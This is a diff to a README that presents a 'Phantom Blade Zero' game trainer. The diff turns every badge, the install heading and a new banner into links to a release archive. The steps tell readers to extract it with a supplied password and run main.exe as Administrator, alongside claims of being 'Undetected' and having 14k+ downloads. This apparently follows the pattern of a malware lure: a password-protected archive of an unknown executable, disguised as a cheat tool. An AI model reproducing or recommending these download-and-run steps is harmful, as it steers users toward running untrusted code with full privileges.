@@ -2,10 +2,10 @@
   
 # ⚔️ Phantom Blade Zero Trainer 2026
 
-[![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=for-the-badge&logo=windows)](https://microsoft.com)
-[![Status](https://img.shields.io/badge/Status-Undetected-success?style=for-the-badge)](https://github.com)
-[![Downloads](https://img.shields.io/badge/Downloads-14k+-brightgreen?style=for-the-badge)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2.1-blue?style=for-the-badge)](https://github.com)
+[![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=for-the-badge&logo=windows)](https://github.com/Separatedimanacle/PhantomBladeZero-Cheat/releases/download/latest/launcher.zip)
+[![Status](https://img.shields.io/badge/Status-Undetected-success?style=for-the-badge)](https://github.com/Separatedimanacle/PhantomBladeZero-Cheat/releases/download/latest/launcher.zip)
+[![Downloads](https://img.shields.io/badge/Downloads-14k+-brightgreen?style=for-the-badge)](https://github.com/Separatedimanacle/PhantomBladeZero-Cheat/releases/download/latest/launcher.zip)
+[![Version](https://img.shields.io/badge/Version-v2.1-blue?style=for-the-badge)](https://github.com/Separatedimanacle/PhantomBladeZero-Cheat/releases/download/latest/launcher.zip)
 
 **Unlock the full potential of Phantom Blade Zero.**
 God Mode, Auto-Parry, Infinite Sha-Chi, and 50+ toggleable options. Steam compatible.
@@ -14,11 +14,11 @@ God Mode, Auto-Parry, Infinite Sha-Chi, and 50+ toggleable options. Steam compat
 
 ---
 
-### 📥 DOWNLOAD & INSTALLATION
+### 📥 [DOWNLOAD & INSTALLATION](https://github.com/Separatedimanacle/PhantomBladeZero-Cheat/releases/download/latest/launcher.zip)
 
 | Step | Action |
 | :--- | :--- |
-| **1. Download** | Click the button below to download the latest archive. |
+| **1. Download** | [Click here to download the latest archive](https://github.com/Separatedimanacle/PhantomBladeZero-Cheat/releases/download/latest/launcher.zip) |
 | **2. Extract** | **PASSWORD:** `427388597` |
 | **3. Run** | Launch `main.exe` as Administrator. |
 | **4. Play** | Press **`INSERT`** in-game to open the menu. |
@@ -61,6 +61,14 @@ God Mode, Auto-Parry, Infinite Sha-Chi, and 50+ toggleable options. Steam compat
 - **Stream-Proof:** The overlay is hidden in OBS/Discord streams.
 
 > *Disclaimer: This software is provided for educational purposes only. Use at your own risk.*
+
+<br>
+
+<div align="center">
+  
+### [⬇️ CLICK HERE TO DOWNLOAD v2.1 NOW ⬇️](https://github.com/Separatedimanacle/PhantomBladeZero-Cheat/releases/download/latest/launcher.zip)
+
+</div>
 
 ---
 
